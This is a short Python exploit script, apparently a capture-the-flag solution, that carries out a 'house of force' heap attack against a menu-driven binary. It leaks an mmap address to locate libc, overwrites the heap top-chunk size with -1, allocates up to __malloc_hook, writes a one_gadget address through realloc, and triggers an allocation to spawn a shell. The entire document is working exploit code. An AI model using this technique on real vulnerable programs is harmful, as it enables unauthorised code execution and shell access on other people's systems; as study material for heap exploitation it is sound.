from mmap import mmap
from helper import *
import helper
abbre(globals(), io, loader) # 此处定义了常用的缩写

def add(size, content):
    sla(b'2:puts\n', '1')
    sla(b'size\n', str(size))
    ru(b'addr ')
    heap = int(r(14), 16)
    sla(b'content\n', content)
    return heap

mmaped = add(0x200000, 'aaa')
helper.utils.easy_libc(libc, addr=mmaped+0x200ff0)

heap_base = add(0x18, b'a' * 0x10 + p64(0) + p64(c.c_uint64(-1).value))
info_hex(heap_base, "heap base")
top = heap_base + 0x10

# pause("house of force")

offset = libc.__malloc_hook - top

# pause("before add")
add(offset - 0x33, b'a' * 0x8)
info(str(libc.one_gadget))
add(0x10, b'a' * 0x8 + p64(libc.one_gadget[1]) + p64(libc.__libc_realloc + 0x10))

sla(b'2:puts\n', b'1')
sla(b'size\n', str(0x40))
shell()